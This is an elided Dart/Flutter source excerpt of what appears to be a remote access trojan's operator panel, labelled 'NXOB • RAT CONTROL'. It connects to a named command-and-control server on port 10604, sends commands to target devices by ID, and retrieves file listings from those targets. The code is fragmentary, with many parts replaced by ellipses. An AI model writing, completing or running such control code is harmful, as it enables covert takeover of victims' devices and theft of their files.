...
class _ControlCenterPageState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  ...
  void _initSocket() {
    try {
      socket = IO.io(
        'http://server.sanzyoffc.panelantirusuh.biz.id:10604',
        IO.OptionBuilder()
  ...
  Future<void> _sendCommand(String command, String targetId, {String? extra}) async {
    ...
    try {
      ...
      final response = await http.post(
        Uri.parse("http://server.sanzyoffc.panelantirusuh.biz.id:10604/api/send-command"),
  ...
  void _fetchFiles(String path, StateSetter setStateDialog, List<Map<String, dynamic>> files, bool loading) async {
    ...
    try {
      ...
      final response = await http.get(Uri.parse("http://server.sanzyoffc.panelantirusuh.biz.id:10604/api/get-response/${_targetId}"));
    ...
    return Padding(
      ...
      child: Column(
        children: [
          ...
          Text("NXOB • RAT CONTROL", style: TextStyle(color: Colors.white.withOpacity(0.1), fontSize: 7, letterSpacing: 3, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600)),
        ],
      ),
    );
  }
